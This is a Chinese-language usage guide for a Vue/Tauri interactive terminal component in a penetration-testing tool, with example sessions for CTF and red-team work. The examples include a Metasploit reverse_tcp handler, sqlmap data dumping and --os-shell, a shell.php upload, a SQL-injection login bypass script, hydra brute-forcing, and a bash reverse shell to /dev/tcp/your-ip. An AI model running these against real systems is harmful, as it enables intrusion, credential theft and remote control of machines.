# Interactive Terminal 使用示例

## 快速开始示例

### 示例 1: 基础使用

```vue
<template>
  <div class="page">
    <h1>Security Terminal</h1>
    <InteractiveTerminal />
  </div>
</template>

<script setup>
import InteractiveTerminal from '@/components/Tools/InteractiveTerminal.vue'
</script>
```

### 示例 2: Metasploit Console

```vue
<template>
  <div class="msf-console">
    <div class="header">
      <h2>Metasploit Framework Console</h2>
      <button @click="startMsf">Start msfconsole</button>
    </div>
    <InteractiveTerminal ref="terminal" />
  </div>
</template>

<script setup>
import { ref } from 'vue'
import InteractiveTerminal from '@/components/Tools/InteractiveTerminal.vue'

const terminal = ref(null)

const startMsf = () => {
  // Terminal will auto-start, just provide instructions
  console.log('Type: msfconsole -q')
}
</script>
```

**使用步骤**:

```bash
# 1. 启动 msfconsole
$ msfconsole -q

# 2. 配置 exploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444

# 3. 启动监听
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0

# 4. 查看会话
msf6 exploit(multi/handler) > sessions -l

# 5. 交互会话
msf6 exploit(multi/handler) > sessions -i 1
```

### 示例 3: SQLMap 交互式扫描

```bash
# 1. 基础扫描
$ sqlmap -u "http://target.com/page?id=1" --batch

# 2. 深度扫描
$ sqlmap -u "http://target.com/page?id=1" --level=3 --risk=2 --batch

# 3. 获取数据库
$ sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 4. 获取表
$ sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# 5. 获取数据
$ sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch

# 6. OS Shell
$ sqlmap -u "http://target.com/page?id=1" --os-shell --batch
```

### 示例 4: 多步骤渗透测试工作流

```bash
# === 阶段 1: 信息收集 ===

# 1. 主机发现
$ nmap -sn 192.168.1.0/24

# 2. 端口扫描
$ nmap -sV -p- target.com

# 3. 服务识别
$ nmap -sC -sV -p 80,443,8080 target.com

# === 阶段 2: 漏洞扫描 ===

# 4. Web 目录扫描
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 5. 子域名发现
$ subfinder -d target.com

# 6. Web 漏洞扫描
$ nikto -h http://target.com

# === 阶段 3: 漏洞利用 ===

# 7. SQL 注入测试
$ sqlmap -u "http://target.com/page?id=1" --batch

# 8. XSS 测试
$ echo "<script>alert('XSS')</script>" # 手动测试

# 9. 文件上传测试
$ curl -F "file=@shell.php" http://target.com/upload.php

# === 阶段 4: 后渗透 ===

# 10. 启动 msfconsole
$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > exploit -j
```

### 示例 5: Python 脚本开发和测试

```bash
# 1. 创建 Python 脚本
$ cat > exploit.py << 'EOF'
#!/usr/bin/env python3
import requests

target = "http://target.com/api"
payload = {"username": "admin' OR '1'='1", "password": "test"}

response = requests.post(target, json=payload)
print(response.text)
EOF

# 2. 赋予执行权限
$ chmod +x exploit.py

# 3. 运行脚本
$ python3 exploit.py

# 4. 调试模式
$ python3 -m pdb exploit.py
```

### 示例 6: 自动化扫描脚本

```bash
# 创建自动化扫描脚本
$ cat > auto_scan.sh << 'EOF'
#!/bin/bash

TARGET=$1
OUTPUT_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[*] Starting scan for $TARGET"

# Nmap 扫描
echo "[*] Running Nmap..."
nmap -sV -oN $OUTPUT_DIR/nmap.txt $TARGET

# Gobuster 目录扫描
echo "[*] Running Gobuster..."
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTPUT_DIR/gobuster.txt

# Nikto 扫描
echo "[*] Running Nikto..."
nikto -h http://$TARGET -o $OUTPUT_DIR/nikto.txt

echo "[*] Scan complete! Results in $OUTPUT_DIR"
EOF

$ chmod +x auto_scan.sh
$ ./auto_scan.sh target.com
```

## 高级使用场景

### 场景 1: CTF 竞赛

```bash
# 1. 快速端口扫描
$ nmap -p- --min-rate=1000 -T4 ctf.target.com

# 2. Web 服务枚举
$ gobuster dir -u http://ctf.target.com -w /usr/share/wordlists/dirb/big.txt -x php,txt,html

# 3. 查找隐藏文件
$ ffuf -u http://ctf.target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200

# 4. SQL 注入快速测试
$ sqlmap -u "http://ctf.target.com/login.php" --forms --batch --level=5

# 5. 反弹 Shell
$ nc -lvnp 4444  # 在另一个终端
$ bash -i >& /dev/tcp/your-ip/4444 0>&1  # 在目标上执行
```

### 场景 2: 红队演练

```bash
# 1. 被动信息收集
$ theharvester -d target.com -b all

# 2. 子域名枚举
$ subfinder -d target.com | httpx -silent

# 3. 截图所有 Web 服务
$ cat subdomains.txt | httpx -screenshot

# 4. 漏洞扫描
$ nuclei -l urls.txt -t cves/

# 5. 凭证爆破
$ hydra -L users.txt -P passwords.txt ssh://target.com
```

### 场景 3: 应急响应

```bash
# 1. 系统信息收集
$ uname -a
$ cat /etc/os-release

# 2. 网络连接检查
$ netstat -tulpn
$ ss -tulpn

# 3. 进程检查
$ ps aux | grep -E "(nc|ncat|bash|sh)"

# 4. 可疑文件查找
$ find / -name "*.php" -mtime -1

# 5. 日志分析
$ tail -f /var/log/apache2/access.log | grep -E "(sql|xss|shell)"
```

## 集成到工作流

### 工作流 1: 自动化漏洞评估

```typescript
// 在 Vue 组件中
import { invoke } from '@tauri-apps/api/tauri'

async function runVulnerabilityAssessment(target: string) {
  // 1. 启动终端服务器
  await invoke('start_terminal_server')
  
  // 2. 执行扫描命令序列
  const commands = [
    `nmap -sV ${target}`,
    `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt`,
    `nikto -h http://${target}`,
    `sqlmap -u "http://${target}/?id=1" --batch`
  ]
  
  // 3. 在终端中执行（用户可以看到实时输出）
  console.log('Commands to run:', commands.join('\n'))
}
</script>

### 工作流 2: 持续监控

```bash
# 创建监控脚本
$ cat > monitor.sh << 'EOF'
#!/bin/bash

while true; do
  echo "=== $(date) ==="
  
  # 检查目标是否在线
  if ping -c 1 target.com > /dev/null; then
    echo "[+] Target is UP"
    
    # 检查开放端口
    nmap -p 80,443 target.com | grep open
    
    # 检查 Web 服务
    curl -I http://target.com
  else
    echo "[-] Target is DOWN"
  fi
  
  sleep 300  # 5 分钟
done
EOF

$ chmod +x monitor.sh
$ ./monitor.sh
```

## 最佳实践

### 1. 使用会话管理

```typescript
// 保存会话 ID
let sessionId: string = ''

// 连接时获取
ws.onmessage = (event) => {
  if (event.data.startsWith('session:')) {
    sessionId = event.data.substring(8)
    localStorage.setItem('terminal_session', sessionId)
  }
}

// 重连时使用
const savedSession = localStorage.getItem('terminal_session')
if (savedSession) {
  // 尝试重连（需要实现）
}
```

### 2. 命令历史

```typescript
const commandHistory: string[] = []
let historyIndex = -1

terminal.onData((data) => {
  if (data === '\r') {
    // 保存命令
    const command = getCurrentCommand()
    commandHistory.push(command)
  } else if (data === '\x1b[A') {
    // 上箭头 - 上一条命令
    if (historyIndex < commandHistory.length - 1) {
      historyIndex++
      showCommand(commandHistory[commandHistory.length - 1 - historyIndex])
    }
  }
})
```

### 3. 输出日志

```typescript
const logFile: string[] = []

ws.onmessage = (event) => {
  const data = event.data
  logFile.push(`[${new Date().toISOString()}] ${data}`)
  
  // 定期保存
  if (logFile.length > 100) {
    saveLog(logFile.join('\n'))
    logFile.length = 0
  }
}
```

## 故障排查示例

### 问题: 命令无响应

```bash
# 检查进程
$ ps aux | grep bash

# 检查容器
$ docker ps | grep sentinel-sandbox

# 重启会话
# 在前端断开并重新连接
```

### 问题: 输出乱码

```bash
# 设置正确的编码
$ export LANG=en_US.UTF-8
$ export LC_ALL=en_US.UTF-8

# 或在终端配置中设置
```

### 问题: 性能问题

```bash
# 检查容器资源
$ docker stats

# 限制输出
$ your-command | head -100

# 使用分页
$ your-command | less
```

## 参考资源

- [Metasploit Documentation](https://docs.metasploit.com/)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster Usage](https://github.com/OJ/gobuster)
- [Kali Linux Tools](https://www.kali.org/tools/)
